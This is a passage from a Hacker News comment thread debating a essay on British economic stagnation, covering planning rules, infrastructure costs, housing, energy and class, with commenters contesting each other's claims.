Scotland. And our tax burden is even higher (if you’re a middle or high earner at least) reply barry-cotter 6 hours agoparentprev> real stench of decline in England at the moment Real GDP per capita has been flat since 2008 while official population figures show population has increased by 10m. Total failure to grow the economy in 14 years of Tory rule and Labour aren’t exactly showing signs of having ideas to grow either. reply benrutter 8 hours agoprevReally interesting and well researched read. The main take away seems to be that Britain has seen a lack of state funded infrastructure development and it's paying the price for this, especially in the energy sector. I'm obviously oversimplifying, but I think that's an ok rough summary. I think it's well argued and evidenced in the article, but I'm interested in this question: why isn't the US stagnating? My understanding is that it has had a similarly low infrastructue development, but conversely is doing well economically. What's the deal? reply nine_k 7 hours agoparentThe US has a huge internal market, with free interstate trade and no need for localization. The US has accumulated colossal scientific and R&D resources, which regularly produce industrial breakthroughs. Lower taxes help, too. (Lower taxes is what a country can afford for general benefit, not a sloppy pro-rich policy.) But most importantly, USD is effectively the world's reserve currency, so the US can literally print money, and much of the rest of the world would gladly take it; it's like gold, only buttressed by the US's economic and military might. The UK has none of these advantages. The British Empire had some of these, but it's gone. Another large factor is that the US emerged from WWII relatively unscathed, while Britain was badly hit, and could not grow as fast. (Edit: typos.) reply ignoramous 5 hours agorootparentAnother factor is that Quantitative Easing (QE) kind of works for the US, but not for the UK: https://youtube.com/watch?v=goA9kkaDfTE / https://ghostarchive.org/varchive/goA9kkaDfTE reply foobarian 4 hours agorootparentThat's a consequence of being world's reserve currency reply regularfry 4 hours agorootparentprevThe UK emerged from WWII massively indebted to the US. That's not entirely unrelated to the UK's position post-war. reply tommy5dollar 8 hours agoparentprevI don't think \"state funded\" is the important part to take away from the piece, it's a shortage of infrastructure in general, both state and private, in part due to incredibly restrictive rules. These days you can easily trap a planned piece of infrastructure in court cases for years for largely spurious reasons. reply nicoburns 5 hours agorootparentHaving recently visited the US, the infrastructure there (at least in the parts of California I visited) is noticeably worse than in Europe (including the UK). So I don't think it can just be about infrastructure. reply noja 7 hours agorootparentprev> incredibly restrictive rules. Like what? Are you referring to the self-regulation at Grenfell Tower? reply avianlyric 5 hours agorootparentIt’s not so much restrictive rules, as it is a planning system that prioritises local concerns, regardless of how minor, or incorrect, over any kind of national priority. Our planning system is literally designed to maximally empower NIMBYism. There are no well defined planning rules, or zoning, or planning process. Every council develops their own planning policy, and broadly has the power to block any project. The result is building anything requires millions of pounds, and years of effort, to work through a councils arbitrary, and ever changing planning rules, with no guarantee of any kind of success. Most of the rest of the world operates some kind of permitted development zoning policy, where planning policy tends to provide clear rules around what can always be built in a specific area. So it possible to start a development process knowing that certain aspects of your project must be approved, as long as you follow the rules. Unlike the UK where you project might be approved if you managed to somehow follow all the undocumented, arbitrary, and changing local rules. Consequences are quite simple, only projects that are absolutely guaranteed to return large profits if successful are built. And for those projects there’s very little incentive for high quality building, because there’s no competition in the area, and costs of getting permission are so high, that a developers unique selling point is their ability to get permission, not their ability to actually build well. With regards to Grenfell, that’s the consequence of have shambolic building regulations (I.e. regulations on the quantity and safety of buildings), and a construction industry that can only make money by cutting corners, because the supply of actual work is so low. reply PaulDavisThe1st 4 hours agorootparentWhile not denying in any way that this sort of thing is a real problem, I think you're overstating differences between the UK and \"the rest of the world\". Although zoning in the USA does work to a degree as you say (\"must be approved if you ...\"), in reality lots of projects that seem as if they ought to be a sure thing for approval face years of process-based objections from local groups, leading to them never being built at all, or having to be significantly revised due to changes demanded or created by circumstances shifting. reply dash2 5 hours agorootparentprevOP is more likely to be referring to e.g. Green Belt planning restrictions. reply gadders 7 hours agorootparentprevIt was regulations that made the cladding be installed in the first place, I thought? reply gm3dmo 5 hours agorootparentPoor quality of regulation allows sociopath installer who well knows the risk to use lowest cost materials to line their pockets. reply gadders 5 hours agorootparentYes, or no regulation at all an unsafe cladding is not installed. reply gm3dmo 5 hours agorootparentprevI give them the benefit of the doubt. They are of the opinion its hard to get anything built because of regulations at the planning stage. Difficult to see anybody but piggy sticks trying to get away with building with highly flammable materials. reply shortrounddev2 5 hours agorootparentprevThe thames tunnel costing as much in planning as Norway spent actually building the longest tunnel in the world. Construction projects are so fraught with regulatory burden that most of these costs are going to legal fees. It's not that they're not spending money. It's that public infrastructure is a money pit of legal fees reply ninalanyon 5 hours agorootparentBuilding a tunnel through a stable and self supporting granite mountain is a bit different from building one under a river that is on top of a slab of clay and sand so I don't think the two projects are directly comparable. And the regulations are really not that different here in Norway. What is different is that there is a less adversarial society. We are a little more inclined to thrash out the problems in discussion rather than litigation. But there are plenty of infrastructure projects here that take longer and cause more disruption than they should. For instance the upgrade to the E18 between Oslo and Drammen on which 17 billion kroner (1.7 billion USD) has already been spent without getting halfway and the southern half of the project has been scrapped because of the cost of buying out the people who live in the way of the new route. https://www.nettavisen.no/okonomi/ny-nasjonal-transportplan-... reply physicsguy 4 hours agorootparentThe main issue in the UK is the ridiculous circle of environmental impact assessments, and statutory consultees. The list of organisations that can by law be required to be consulted on any development is insane: https://www.gov.uk/guidance/consultation-and-pre-decision-ma... Environental impact assessments now run to millions of pages. Every big infra planning application tries to anticipate any possible complaint, and the whole cost balloons. reply ryan93 5 hours agorootparentprevBad faith reply reply machinekob 8 hours agoparentprevUS is energy independent and is desirable place for middle and higher class specialist. Compared to overtaxed and energy starved England which live from legacy sectors and cheap immigration workers and is not desirable for anyone not working in finances. reply sofixa 5 hours agorootparent> live from legacy sectors Finance is a legacy sector now? > energy starved Importing energy while ramping up your own production with wind and tidal, and importantly, nuclear, is not \"starved\". Is there a lack of energy in the UK? Blackouts like the ones in Texas? reply machinekob 4 hours agorootparentMan blackout != energy starved, you can have blackouts cause your infrastructure is attacked or just random natural disaster, look at energy prices compare it to China or even US not even speaking about oil rich countries. Finance in UK is indeed legacy it is mostly big old banks there is still a bit of fintech and ofc. head funds, but UK is bleeding both talent and market share to CN and US. Not even speaking about tech salaries 10 years ago London was one of the top paying places for finance tech, now it is (ofc.) USA and CN (especially with cost of living). reply sofixa 4 hours agorootparent> Finance in UK is indeed legacy it is mostly big old banks there is still a bit of fintech Many fintech b2c innovators come from the UK. Revolut and Monzo provide features with a UX and API that US banks couldn't even dream of. > Man blackout != energy starved, you can have blackouts cause your infrastructure is attacked or just random natural disaster, look at energy prices compare it to China or even US not even speaking about oil rich countries. Yes you can, but that's not why Texas has blackouts. The UK has expensive electricity, imports a lot, but on what planet is it \"energy starved\"? reply machinekob 3 hours agorootparentI mean isn't UK starving? it can't produce enough energy, it cost is extremely high to produce anything and it can't get proper industrial/manufacture power base cause of that? (and a lot of other stupid reasons) reply sofixa 2 hours agorootparent> I mean isn't UK starving No? reply pjc50 5 hours agorootparentprevNo blackouts, but it's now very expensive. The system management is quite good but the cost is a serious political issue. (It's also an oddity that the Conservative government presided over a lot of green transition in the energy sector, but can't take credit for it because of their base) reply jandrewrogers 3 hours agoparentprevAn important aspect is that the US is that its economies and regional cultures are diverse and dispersed. The US is simply too decentralized to stagnate effectively. It is not a monoculture in any practical sense which creates a system that can respond quickly to evolutionary pressure. Everything good and bad you hear about the US usually only applies to a subset of the country and often only a handful of cities. There is a high degree of regional specialization in the US as a consequence. No matter what happens in the world, some part of the US is perfectly positioned to take advantage of that. Combine this with general American risk tolerance and business acumen, and you have a country that is unusually organically adaptive to changing global economies. reply glimshe 8 hours agoparentprevThe US has a more robust system for supplying infrastructure through private investment - including in the energy sector. reply hnlmorg 8 hours agorootparentYou say that but the UK has not experienced the kind of energy disruptions that, for example, the Texans have since the 1970s. Let’s also not forget the railroad problems you face. You’re probably the only country that makes Britain look good for its rail infrastructure. Having driven on both American roads and British roads, I’d say UK rural roads are to a much higher standard. However that I can give America a pass on that particular issue because the vast distances in some rural parts does change the problem somewhat. But it is another example of how private investment doesn’t reach all parts of the US infrastructure. Internet access in rural communities is much better in the UK. Mains water quality is to a higher standard and available to more rural communities. And let’s not even get started on the sorry state of US healthcare. The NHS might have its problems but at least it’s not leaving people choosing between medical treatments and bankruptcy. The problem is, whenever the US government tries to step in to improve things, the ultra conservatives and libertarians then compare those policies to communism. Which is absurd. reply glimshe 6 hours agorootparentEngland is a small country, smaller than the US state of Georgia. It's much easier to maintain way shorter roads with its much higher population density. Nonetheless, the rural roads in the US are generally of good to excellent quality. reply hnlmorg 2 hours agorootparent> England is a small country, smaller than the US state of Georgia. It's much easier to maintain way shorter roads with its much higher population density. A point I made in my post. reply fidotron 7 hours agorootparentprev> You say that but the UK has not experienced the kind of energy disruptions that, for example, the Texans have since the 1970s. The energy disruptions the UK had in the 70s were how Thatcher came into power. https://en.m.wikipedia.org/wiki/Three-Day_Week reply tempfile 5 hours agorootparentThe article you link to explains that the Three Day Week led to the collapse of the Conservative gov in 74, and while Thatcher became leader, she did not come into power until 79. If the power outages led to anything, it was to a Labour gov. (this is unrelated to the correct statement that there were widespread outages throughout the 70s) reply PaulDavisThe1st 4 hours agorootparentprevThose \"disruptions\" occured because of political action. The disruptions in Texas are because their power grid and associated infrastructure is shite. Entirely different things. reply shortrounddev2 5 hours agorootparentprevThe US has one of the largest freight rail networks in the world. We don't have as big of a passenger rail investment because nobody would ride most of it reply avianlyric 5 hours agorootparentHas it occurred to you that nobody rides passenger rail in the US because there’s zero investment in passenger rail, and as a consequence the U.S. has managed to build a rail system that more difficult to use that flights, and somehow still slower than cars. I can’t think of anywhere else in the developed world where the train system is the slowest form of motorised transport around. reply shortrounddev2 5 hours agorootparentPeople ride passenger rail where it makes sense. The acela line being a good example. But if they built a high speed rail between Texas and Ohio, nobody would ride that, because flying would still be faster. We could build some HSR between major cities in Texas, Florida, California, and the Northeast corridor, but it would account for a handful of straight railways. There are major problems with building these (California is several billion over budget on their high speed rail and I don't think they've even started building), so the criticism of US overregulation is valid, but the main reason we don't have as extensive of a passenger rail system is because it wouldn't be economically viable in a country as sparsely populated as the united states reply PaulDavisThe1st 4 hours agorootparentMany areas of the USA have population densities entirely comparable with large parts of Europe. The upper-central midwest (eastern MN, WI, IL, IA) is a good example - it compares favorably to most of France or Germany. This is another example of how it is almost always a mistake to use a unitary description of anything when it comes to the USA. Yes, certainly where I live (New Mexico), population density is extremely low and long-haul rail transportation likely makes little sense. But talk about that as if it applies to \"the united states\" is a category error. reply hnlmorg 2 hours agorootparentIt’s common to travel between European counties by rail instead of plane. In fact I’ve done this myself. reply PaulDavisThe1st 2 hours agorootparentIn the US southwest, it's not the distance, it's the very small numbers of people who are moving around that is the problem. reply hnlmorg 1 hour agorootparentSorry, I meant to reply to the person before you about how people chose to fly rather than go by rail. reply wakawaka28 6 hours agorootparentprev>Let’s also not forget the railroad problems you face. You’re probably the only country that makes Britain look good for its rail infrastructure. You give the US a pass on roads due to great distances, but not on rail? Rail is even more expensive than roads. On the subject of roads, it is important to remember that US roads vary greatly in quality based on geography, weather, and economic conditions. Every state gets some federal money and fuel taxes to pay for roads. >Internet access in rural communities is much better in the UK. The US had plans to subsidize Starlink for rural communities but the current administration interfered with it for petty political reasons. Again with this, the distances involved matter a lot. >And let’s not even get started on the sorry state of US healthcare. The NHS might have its problems but at least it’s not leaving people choosing between medical treatments and bankruptcy. NHS has problems like, you might not get treatment in a timely manner despite the high taxes you pay for that service. The US has issues with cost. We pay more than practically any other country including on medication. I think that is due to corruption. The issue is not that the state does not pay for it. It often does end up paying exorbitant prices for people without insurance, or on government benefits, to be treated. A majority of elderly people in the US are collecting government benefits and healthcare. It's not much but it does cover a significant amount of stuff. >The problem is, whenever the US government tries to step in to improve things, the ultra conservatives and libertarians then compare those policies to communism. Which is absurd. It is true that government can invest in worthwhile things sometimes, but when the government messes things up on a regular basis then you instinctively reject whatever it proposes. Neither the UK nor the US can afford our existing social programs. Yet here you are proposing that we here in the US spend even more so we can be like the UK. No thanks, we have enough problems as it is without higher taxes and more government scams. reply hnlmorg 2 hours agorootparentIf you want to argue about distances then let’s talk about Europe as a wider entity rather than just one country. And Europe still comes out on top for quality of infrastructure. The problem with the NHS is due to the amount of budget cuts from the Tory government. The problem with the American health system is the exact opposite, it costs too much because private entities are greedy. Government intervention would be more legislative than financial. reply PaulDavisThe1st 4 hours agorootparentprev> the current administration interfered with it for petty political reasons I'm not entirely sure that doubts about handing fistfuls of cash to a corporation headed by an increasingly politically extreme CEO whose 2nd generation satellites are leaking so much radio energy that radio astronomy in that band of the spectrum looks doomed is \"petty\". reply lkrubner 8 hours agoparentprevSince the crisis of 2008 the USA has had several trillion dollars in stimulus spending. Very roughly speaking, Europe pursued policies of austerity, whereas the USA followed a more Keynesian route of big spending. On this matter, the Keynesians have been vindicated. In 2007 the GDP of the EU was slightly larger than the USA, but now it has fallen far behind: $16 trillion ($18 trillion if it still had the UK) versus $25 trillion for the USA. And the most important policy difference since 2008 has been large stimulus spending in the USA, versus relative austerity in Europe. More recently, President Biden was able to push through some big infrastructure bills, which should power the USA through the 2020s. (There are some qualifiers to be added about weaknesses in the USA system of funding and allowing construction, in particular the aggressive system of \"substantive due process\" that allows for any project to be stalled by lawsuits, but despite that, the USA has done better than Europe.) reply machinekob 7 hours agorootparentMost of the difference in GDP was because Dollar was a lot cheaper compared to Euro pre Recession. Also EU just stagnate from 1990 until now it is yearly losing global share of GDP. reply bluescrn 5 hours agoparentprevA lack of infrastructure development combined with a population being artificially increased by high levels of immigration, which is applying downward pressure on wages while pushing property costs (the source of most of the UK's problems) ever higher. A population increase of around 1% per year may not seem huge until you consider what 1% of the UK road network or 1% of the NHS actually looks like, and what it'd take to build infrastructure and expand services at that rate year upon year. The reality of building infrastructure in the UK is HS2 - a 20+ year project to build a little over 100 miles of high speed railway (with future northern phases predictably cancelled), at a cost over over half a billion quid per mile - it'll likely put any government off attempting any significant infrastructure construction ever again. reply PaulKeeble 8 hours agoparentprevIts also that its really expensive. The reasons given are the cost of planning but I also suspect given all that has been exposed over the past 40 years that widespread corruption by governments in power is actually a big part of the ballooning costs. reply noja 7 hours agoprev> 800,000 British families have second homes compared to 3.4 million French families. Why the focus on second homes? I would care more about utilisation of homes by home-owners: walk around London at night, so many apartments are dark. The locals say investors own them. reply dkdbejwi383 5 hours agoparentI'm not so sure counting lights on at any given moment is a good measure of occupancy. The resident might be at work, at the gym, out for dinner or at the cinema, at a friend's house, in another room, might have good blackout curtains and only use lamps for ambience instead of the ceiling light, on holiday. I bet if you stood outside one of these buildings where \"most of the lights are off\" for the entire evening, you'd see lights come on and off, and in aggregate find that most of the flats were in fact occupied. By the same logic, I could look outside my window right now, count zero cars driving down the road and declare it a useless waste that nobody uses. reply barry-cotter 7 hours agoparentprevThe French are richer than the British. They have more stuff and a higher quality of life. It would be good for more British people to have more stuff and a higher quality of life. Building more housing allows both for more people to afford a (better quality of) primary residence, and for more people to have a holiday home. Those are all good. Focussing on utilisation is Green Party, NIMBY, degrowth, pro-poverty thinking. It sees a fixed pie and thinks how to distribute it instead of trying to make everything better for everyone. More housing. A holiday home should be an utterly normal thing for a middle class family like in Finland or Spain. reply noja 7 hours agorootparent> Building more housing allows both for more people to afford a (better quality of) primary residence As long as residential homes are a vehicle for investors rather than _living in_ (by the owner) you will have a problem. reply dukeyukey 6 hours agorootparentWhy not enable a dynamic rental sector so people can move around the country to better jobs? Feels mean to trap people. reply bluescrn 5 hours agorootparentGreed, combined with a housing shortage, and the housebuilding that is going on being poorly planned (no new infrastructure, as many homes crammed onto small patches of land as possible, usually designed around car ownership but without space for the cars, etc) and focused on maximum profit. reply Symmetry 4 hours agorootparentprevWe should build more housing so that homes aren't such good investments that people are tempted to do this. reply barry-cotter 7 hours agorootparentprevAgreed. Thankfully we know what it takes to make housing a crappy investment vehicle. Build more housing. Build so much housing that returns on capital invested are flat, live Tokyo since 2000, or negative, like Seattle over the last five years. Make building housing legal again. Also. Renters deserve housing too. Restricting housing to the owner occupied is a great way to hate things by social class but I see no reason to further favour a population that’s richer and more powerful than the rest of the population already. reply thorin 5 hours agorootparentprevThere are more 2nd homes in France because rural housing is relatively cheap and there are lots of land. However the way the employment market works in France has screwed the younger people, I think. It's easy to stay in a job once you have one but hard to get started as a younger person. If I had to guess, France, Italy, Spain etc are in way more decline than the UK as a whole and Germany is spending hard to prop up a lot of the EU. reply misja111 6 hours agorootparentprevNote that in France, unlike on your first home, you don't pay taxes on your second home. See e.g. https://chasebuchanan.com/property-tax-in-france-residential.... reply sofixa 5 hours agorootparentThat's not true. In France you pay both taxe foncière (on any and all property you own) and taxe d'habitation (unless you're renting it for the whole year) on second(and more) homes you own. With some exceptions like newbuilds, newly renovated for better insulation, in very rural places, etc. https://www.service-public.fr/particuliers/vosdroits/F59/per... https://www.service-public.fr/particuliers/vosdroits/F42 reply nicoburns 5 hours agorootparentprevRegarding housing (and land ownership) specifically, France is over twice the size of the UK with a similar population. So there are underlying constraints that cannot easily be papered over with policy. reply kulor 5 hours agoprevSimilar points were covered in the recent Tyler Cowen podcast with Tobi Lütke[1] regarding economic stagnation in Canada & Germany (relative to the US). The UK has a cynical view on progress, likely leading to a self-fulfilling prophecy. The US seems to have a contrasting view with an optimistic by default outlook. 1. https://conversationswithtyler.com/episodes/tobi-lutke/ reply willtemperley 7 hours agoprevWe have fully embraced the parasite economy in the UK, however unlike big American tech we feed on one another. The safest business for a long time has been property, poor quality reno-flips and rentals, which adds nothing except burden to the people who might bring foreign income through being entrepreneurial. reply dambi0 4 hours agoprevThe article is fairly misleading. Despite claims to the contrary the list of facts is nothing more than \"disconnected observations\". They lack any serious context or nuance. For every single one it's possible to ask whether the observation is a fair comparison or something that should be the case. Take the number of second homes relative to France. Is more second homes a good thing? Take electricity production, might we not argue that the UK uses energy more efficiently rather than lagging what other countries generate? reply langsoul-com 8 hours agoprevHow can there be a 360, 000 page document to build something. That number seems so outrageously high. Is the font size massive or something? reply gadders 7 hours agoparentI live in the catchment area. The amount of consultations etc they have to hold to mollify the general anti-growth fanatics and newt-fanciers is insane: https://nationalhighways.citizenspace.com/ltc/lower-thames-c... reply cassepipe 7 hours agoparentprevI believe this Map Men video has the answer : https://www.youtube.com/watch?v=pWZ9ZVRQ0Nw reply nine_k 8 hours agoparentprevIf most of that are technical drafts going down to smallest details, I can imagine how it could be sort of reasonable. Large things like, say, nuclear power plants or huge ships have literally millions of parts. reply lithos 7 hours agoparentprevSeems pretty reasonable actually. Final reports contain -everything- and I really do mean everything. Design docs and drawings obviously (easily 1k pages more if you fit it on a4), since each trade needs it's own views. Specifications are included, as a legal document that calls out which regulations every possible system will follow and calls out exceptions (proof they apply). All possible testing from receiving it (and documentation including pictures), proof of setup, proof of commissioning (IE construction essentially needs to do what a tech bro would do with automated testing, by hand with with each step documented and signed for, and each possible state the system could be in). Any other type of test report NETA/material quality/thermography/whatever (a single breaker easily comes to two pages of test report, a voltage/current meter easily comes to three pages per phase). Pictures are likely kept to only two per A4 page. Basically it's a \"declaration from ignorance\", since big numbers sound scary and wasteful to others who haven't worked in the field. reply dukeyukey 6 hours agorootparentThe question is, why did it cost significantly more to produce that document than it cost Norway to just build an even bigger tunnel? Pages might be misleading, but cash is not. reply physicsguy 4 hours agorootparentprevIt isn't, it's largely environmental impact studies. The actual plans are a tiny part of the submitted document. reply barry-cotter 6 hours agorootparentprev> Seems pretty reasonable actually. Final reports contain -everything- and I really do mean everything. No it doesn’t. It’s an outrage and a powerful argument against the entire system that produced it. There is no sane way that spending more money on stakeholder consultation for a comparable tunnel than Norway spent on building one can be defended. reply kranke155 8 hours agoprevThe main reason Britain is failing is it wiped out its industrial base. Without that, it cant build anything effectively. reply dukeyukey 6 hours agoparentThe UK's manufacturing sector is comparable to France's in size. reply kranke155 3 hours agorootparentAh you're right. Fair. I thought France was in between UK and Germany, but actually its comparable. Germany being much higher. reply ninalanyon 5 hours agorootparentprevBut at ground level it seems to get less done, less well. Just look at the dreadful state of repair of the average British town compared to comparable French towns. reply dukeyukey 4 hours agorootparentHousing state of repair and a country's manufacturing sector aren't much to do with each other. Like, at all. reply ninalanyon 3 hours agorootparentNot at all? Someone has to manufacture the parts and materials and surely they could be in the same country. Having to buy those things from another country, especially now that the UK is out of the EU is surely a more complicated thing than buying them in the country. So surely there must be some connection. reply kranke155 3 hours agorootparentThat was what I was implying. Not sure if its accurate, just a gut feeling atm. reply steve_gh 8 hours agoprevLong essay. TL;DR the UK planning system is too restrictive and is stopping investment. However, some of the comparisons made don't really stack up. Yes. France has a better housing supply, and roughly the same area. But France has over twice the area, and under half the population density, even before you account for the almost uninhabited mountainous areas in Wales, Northern England and Scotland. So our populations are squeezed into smaller areas. There are some good points made though. The gold plating of a lot of projects is ridiculous. And don't get me started on the Elizabeth Line. I get it, it is clearly hugely beneficial and I have no doubt it pays for itself. But then you visit places like Maerdy in the Welsh valleys, devastated by the closure of the coal mines, and it seems obscene to spend all that money in so small an area. reply widdershins 8 hours agoparent>it seems obscene to spend all that money in so small an area Greater London has a population nearly three times that of Wales. So the bang-for-buck in this small area is much greater. I completely agree that we under-invest in areas like Wales. But that doesn't mean that under-investing in the most productive part of the country is a good idea. reply ninalanyon 5 hours agorootparent> most productive part of the country is a good idea. In what sense is London productive? What are the products? reply widdershins 4 hours agorootparentIn the sense of labour productivity, measured in output per hour[1]. The products could be anything, but I'd guess they're primarily services like finance, technology, media etc. https://www.ons.gov.uk/economy/economicoutputandproductivity... reply dukeyukey 3 hours agorootparentprevFinancial services? Software? Scientific research? reply aembleton 3 hours agorootparentprevTax revenue reply misja111 8 hours agoparentprevIt's hard to find any European country that didn't have any government projects that went wildly over budget or were very much delayed. So I don't think this is a UK specific problem, and it doesn't explain why Britain has stagnated compared to most of the EU. reply tommy5dollar 8 hours agorootparentTransport projects seem to be particularly expensive these days in Anglo countries compared to European countries. For instance, we currently have a planned short tunnel in the UK (under the Thames but not in London itself) where the actual planning process has so far cost $400m. reply inglor_cz 7 hours agorootparentStronger property rights tend to backfire in the 2020s as NIMBYs have emerged everywhere and do their best to block anything around them, usually by weaponizing environmental laws. The remedy will probably consist of a combination of legal changes and a change in attitude; YIMBY must become a thing. People respond to social pressures. reply ninalanyon 5 hours agorootparent> Stronger property rights Does the UK have stronger property rights than, for instance, Norway that was mentioned by another contributor here as being so much more efficient? Yet Norway has abandoned, for now at least, the south western half of the Oslo to Drammen E18 road upgrade because buying out the owners of expensive houses on the route would be too expensive. Are you claiming that other comparable democracies have such weak property rights that this significantly affects infrastructure projects? Which ones? reply sofixa 5 hours agoparentprev> Yes. France has a better housing supply, and roughly the same area. But France has over twice the area, and under half the population density, even before you account for the almost uninhabited mountainous areas in Wales, Northern England and Scotland. So our populations are squeezed into smaller areas. If you compare population density maps of France vs the UK, you can see that it's pretty similar - there are clusters of population in certain locations, and wide areas with barely any inhabitants. reply inglor_cz 8 hours agoparentprevAs for Wales ... This pattern repeats itself all over Europe. Only a few places \"made\" the transition from industrial settings to current economy. I am from a former mining city of Ostrava, CZ. It is not completely dead, and it has been slowly improving lately, but it sorely needs something like high-speed rail to become relevant again. (The location is favourable: almost equidistant from Prague, Vienna, Warsaw and close to Krakow; a major railway hub.) But the pattern really repeats itself all over Europe. Italy, Spain, Bulgaria, Germany, Czechia, Poland - former heavy industry hotspots tend to collapse in a very similar fashion. As far as I have seen, Bilbao (ES) and Katowice (PL) were able to rebuild and reinvent themselves the best. Everyone else struggles or gave up the fight entirely. reply soco 6 hours agorootparentYou'd think that exactly because it's such a common pattern, there would be best practices how to help those communities overcome. Yet, the only pattern I see is mainstream politics ignoring it, locals struggling, and rightwing winning them over. It's so obvious that you really have to ask yourself whether there's some hidden agenda somewhere in there. Just like mainstream politics ignoring the younger generations - both as plans for them and as ways to communicate with them - and again who's winning? The rightwing. It's everything in the open. reply JCM9 8 hours agoprevThe UK was, and to some senses still is, a culture that strongly values who your parents are vs what you’ve personally accomplished. The head of state is the child of the previous head of state. The House of Lords is still a thing. Prestige based on family lineage is considered a big deal. In the US and other parts of Europe it’s very different. People value you a lot more because of what you’ve done vs who you are and, with some exception, nobody cares who your parents were. If you have a rich daddy most people don’t care. If you’re rich because you inherited wealth vs earning it that’s see as “less” than those who are self made. While there are certainly exceptions, most of our richest people are in the self-made category and that’s a source of pride. “The American Dream” while a bit of a glossy story is generally a very real thing. Passing off wealth and prestige by lineage has long been shown to be a bad idea. The next generation typically just screws it up. Until the UK truly does away with its still quite hereditary ways and focuses a lot more on valuing individual achievement it will likely only continue to stagnate against other economies that have long since broadly moved on from such archaic mental models. reply gmac 8 hours agoparent> Prestige based on family lineage is considered a big deal Are you in the UK? The monarchy and House of Lords are an obvious anachronism and they need abolishing [1], but I would say it's a very small minority who care who you parents are/were (mainly people who think their own parents are/were a big deal) — and a similar small minority who might also ask \"which school did you go to?\". [1] e.g. https://www.sortitionfoundation.org/ reply flir 8 hours agorootparentI suggest this exercise: Pick a random person from Queen Victoria's court. Look up where their descendants are today. Chances are, they're still running the country in some capacity. (The example I'm thinking of was a Duchess. Her descendant was a beak at Eton who taught Boris and the haunted pencil). reply gadders 7 hours agorootparentTry Norman times: People with Norman names wealthier than other Britons People with \"Norman\" surnames like Darcy and Mandeville are still wealthier than the general population 1,000 years after their descendants conquered Britain, according to a study into social progress. https://www.telegraph.co.uk/news/newstopics/howaboutthat/842... reply bloak 4 hours agorootparentAlso surnames like d'Urberville? (Alec d'Urberville in \"Tess of the d'Urbervilles\" is a nouveau riche person who adopted the name rather than a descendent of the original d'Urbervilles. Probably that happens in real life, too, though I expect the people who did the study have taken that into account and have done the best they can in the absence of reliable public ancestry data.) reply flir 7 hours agorootparentprevIf you read that paper carefully (it's been a while so I might have this wrong), I think you'll see that while they're using Norman vs not-Norman surnames, the comparison is between Victorian and contemporary wealth and life expectancy data. (Obviously the discrepancy has to start with the Conquest, I'm just saying that strictly speaking you can't use that paper to support that conclusion). reply gmac 8 hours agorootparentprevThat's probably true, but it's a quite separate problem (it's about power rather than attitudes). Also, Victoria is only about 100 years ago. I suspect power and wealth are pretty strongly hereditary over that time span in many other democracies. reply gadders 7 hours agorootparentprevI don't think people care what school you went to, but the fact remains that the UK has one of the lowest rates of social mobility in Europe. reply gramie 5 hours agorootparentI think that if you look at the people in positions of control in political and economic sectors (and mass media, which is a key element), the vast majority came from just a few schools. reply dukeyukey 6 hours agorootparentprevI don't think that's actually a fact. I don't know what figures you're using, but eyeballing the Global Social Mobility Index puts the UK as pretty middling in Europe. Less mobile than France or Germany, more so than Italy, Spain, or Poland. reply gadders 6 hours agorootparentIt's below average, and lower than all of Scandinavia, Austria etc. Yes, it beats Southern Europe and ex-communist countries. My source was the Sutton Trust and Oxera. reply jamespo 5 hours agorootparentwell, that's not one of the lowest really is it reply gadders 5 hours agorootparent\"One of\" reply michaelt 7 hours agoparentprev> The UK was, and to some senses still is, a culture that strongly values who your parents are vs what you’ve personally accomplished. I think this statement's accuracy depends heavily on how you're defining things. If I go up to the average Brit and tell them my father is the deputy editor-in-chief of some newspaper? They won't be impressed, they'll think I'm a prick. On the other hand, if I want to pursue a career in journalism? My father will have made sure I've studied the right things, funded me through the right unpaid internships, and will be able to get my job application in front of the right hiring managers. Does \"UK culture strongly value\" who my father is, if 99.99 % of brits don't care, but the remaining 0.01 % can have an outsized impact on my career? (Of course if I've inherited a hundred million quid some people will think I'm important / suck up to me due to the power such wealth confers - but there's nothing uniquely british about that) reply gadders 7 hours agorootparent>> On the other hand, if I want to pursue a career in journalism? My father will have made sure I've studied the right things, funded me through the right unpaid internships, and will be able to get my job application in front of the right hiring managers. It also helps to get an internship if your Dad is literally the editor: https://en.wikipedia.org/wiki/Bella_Mackie reply matthewmorgan 8 hours agoparentprevNot sure who could be down voting you, because you're right. If your parents didn't send you to the right school to learn the right plummy accent, you don't stand much chance. reply docdeek 8 hours agoparentprevOne of the exceptions in the US seems to be around the White House. For a while, when Hillary Clinton was running for President in 2008, it was possible that the US would have had a member of the Bush or Clinton families as either VP or President every year from 1981 thorough to 2017. Such political families are not unique to the US, of course, and the UK has a fair few, too: https://en.wikipedia.org/wiki/Political_family reply nine_k 7 hours agorootparentWith that, Bill Clinton has very humble ancestry, as does Hillary; both trace back to traveling salesmen, small business owners, coal miners, such kind of folks. Parental families of, say, Nigel Farage or Margaret Thatcher were somehow more sophisticated, even though not tracing back to some nobility. Not that coming from a well-off family is bad; I just would like to emphasize that the \"American dream\" of coming to high social positions based in merit, not lineage, worked for Clintons. reply relaxing 7 hours agorootparentprevHillary is not linked hereditarily to Bill, so really you’re talking about 3 people- Bush Sr and his 2 kids. Political dynasties in the US are notable because they’re uncommon, rather than part of the law as in the UK. reply dukeyukey 3 hours agoparentprevWorth pointing out that not only is the UK more American-style entrepreneurial than the rest of Europe (London gets about as much VC investment as France and Germany together), but that UK wealth inequaslity is low by European standards. Like, there's work to do here, but by European standards the UK is doing pretty well. reply widdershins 8 hours agoparentprevI don't think that's really true, outside some niche cultural arenas. Sure, if you're at a posh member's club or a party of aristocrats people might be impressed by your lineage. I would concede that in politics a degree from Oxbridge has an outsized cachet, and those universities traditionally recruited from elite private schools. However, this is diminishing over time, both because those institutions are proactively recruiting from a wider base, and because people are pointing out the unrepresentitive composition of political parties, which then self-correct to stay politically relevent. The hereditary parts of the House of Lords are increasingly unimportant, and the Lords is of minor importance to the political process anyway. Royalty has been politically vestigial for more than a century. But in industry and most business spheres your lineage is unimportant. Just like those other parts of the world you mentioned, it's personal accomplishment that matters. Britain has big problems, but I think archaic veneration for family lineage is only a small force within them. reply dash2 5 hours agoparentprevIsn't socio-economic status more heritable in the US than the UK? In the UK, inheritance tax is 40% and there's probably more redistributive taxation in general. reply csomar 7 hours agoparentprevRevolutionary France never made it across the channel... On the other hand, this significantly dismiss the UK contributions to the world on global trade and during the industrial revolution. reply card_zero 6 hours agorootparentBritain had multiple revolutions earlier on. There was The Anarchy, Magna Carta, Cromwell, and 1688 when Britain decided to be Dutch for a while. The Declaration of the Rights of Man was inspired by Enlightenment philosophy, and a lot of that was English (or Scottish). The general mood was to look at the French as latecomers. 